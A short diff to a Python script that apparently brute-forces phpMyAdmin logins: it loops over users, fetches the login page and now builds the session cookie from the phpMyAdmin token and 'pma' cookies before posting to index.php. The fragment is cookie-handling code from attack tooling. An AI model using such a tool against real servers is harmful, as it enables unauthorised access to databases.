@@ -33,13 +33,13 @@ for usr in user:
         response = conn.getresponse()
         response.read().decode()
         set_cookie_header = response.getheaders()
-        dest_cookie = []
+        cookie_def = 'phpMyAdmin='+phpMyAdmin_token+';'
         for cookie in set_cookie_header:
-            if cookie[0] == 'Set-Cookie':
-                dest_cookie.append(cookie[1].split(";")[0])
-        
-        cookie_def = 'phpMyAdmin='+phpMyAdmin_token+';'+dest_cookie[1]+';'+dest_cookie[2]+';'+dest_cookie[5]+';'+dest_cookie[6]+';'+dest_cookie[4]
+            if cookie[0] == 'Set-Cookie' and 'pma' in str(cookie[1]):
+                #print(cookie[1])
+                cookie_def = cookie_def + cookie[1].split(";")[0]+';'
 
+        #print(cookie_def)
         post_parameters = urllib.parse.urlencode({'token':token})
         headers = {"Content-type": "application/x-www-form-urlencoded", "Accept": "text/html,application/xhtml+xml,application/xml", 'Cookie':cookie_def} 
         url_php_bf = '/phpMyAdmin/index.php'
